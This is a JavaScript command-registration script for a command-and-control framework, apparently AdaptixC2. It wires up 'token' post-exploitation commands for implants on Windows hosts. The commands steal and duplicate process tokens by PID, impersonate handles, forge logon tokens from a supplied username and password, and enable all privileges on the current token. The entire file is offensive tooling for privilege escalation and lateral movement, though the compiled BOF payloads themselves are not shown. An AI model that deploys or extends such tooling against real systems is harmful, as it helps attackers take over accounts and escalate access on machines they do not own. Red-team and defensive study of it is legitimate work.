var metadata = {
    name: "TK-BOF",
    description: "Token management: token steal, token use, token make, token rm, token revert, token privget",
};

var cmd_tk_steal = ax.create_command("steal", "Duplicate a process token by PID and optionally apply impersonation", "token steal <pid>");
cmd_tk_steal.addArgInt("pid", true);
cmd_tk_steal.addArgBool("--no-apply", "Skip immediate impersonation; print handle only", false);
cmd_tk_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid      = parsed_json["pid"];
    let no_apply = parsed_json["--no-apply"] ? 1 : 0;
    let bof_params = ax.bof_pack("int,int", [pid, no_apply]);
    let bof_path = ax.script_dir() + "_bin/steal." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: token steal");
});

var cmd_tk_use = ax.create_command("use", "Impersonate a previously obtained token handle", "token use <token_handle>");
cmd_tk_use.addArgString("token_handle", true);
cmd_tk_use.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let token_handle = parseInt(parsed_json["token_handle"], 16);
    let bof_params = ax.bof_pack("int", [token_handle]);
    let bof_path = ax.script_dir() + "_bin/use." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: token use");
});

var cmd_tk_make = ax.create_command("make", "Create a token from credentials via LogonUserW", "token make <username> <password>");
cmd_tk_make.addArgString("username", true);
cmd_tk_make.addArgString("password", true);
cmd_tk_make.addArgFlagString("--domain", "domain", false, "Logon domain (default: .)");
cmd_tk_make.addArgBool("--no-apply", "Skip immediate impersonation; print handle only", false);
cmd_tk_make.addArgFlagInt("--logon-type", "logon_type", "Logon type DWORD (default: 9 = NewCredentials)", 0);
cmd_tk_make.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let username   = parsed_json["username"] || "";
    let password   = parsed_json["password"] || "";
    let domain     = parsed_json["domain"] || "";
    let no_apply   = parsed_json["--no-apply"] ? 1 : 0;
    let logon_type = parsed_json["logon_type"] || 0;
    let bof_params = ax.bof_pack("wstr,wstr,wstr,int,int", [username, password, domain, no_apply, logon_type]);
    let bof_path = ax.script_dir() + "_bin/make." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: token make");
});

var cmd_tk_rm = ax.create_command("rm", "Close a token handle and free the kernel object", "token rm <token_handle>");
cmd_tk_rm.addArgString("token_handle", true);
cmd_tk_rm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let token_handle = parseInt(parsed_json["token_handle"], 16);
    let bof_params = ax.bof_pack("int", [token_handle]);
    let bof_path = ax.script_dir() + "_bin/rm." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: token rm");
});

var cmd_tk_revert = ax.create_command("revert", "Drop impersonation and revert to process token", "token revert");
cmd_tk_revert.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/revert." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: token revert");
});

var cmd_tk_privget = ax.create_command("privget", "Enable all privileges on the current token", "token privget");
cmd_tk_privget.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/privget." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: token privget");
});

var cmd_tk = ax.create_command("token", "Token management: steal, use, make, rm, revert, privget");
cmd_tk.addSubCommands([cmd_tk_steal, cmd_tk_use, cmd_tk_make, cmd_tk_rm, cmd_tk_revert, cmd_tk_privget]);

var group_tk = ax.create_commands_group("TK-BOF", [cmd_tk]);
// beacon-only: token impersonation BOFs are only meaningful inside beacon agents
ax.register_commands_group(group_tk, ["beacon", "gopher", "kharon"], ["windows"], []);
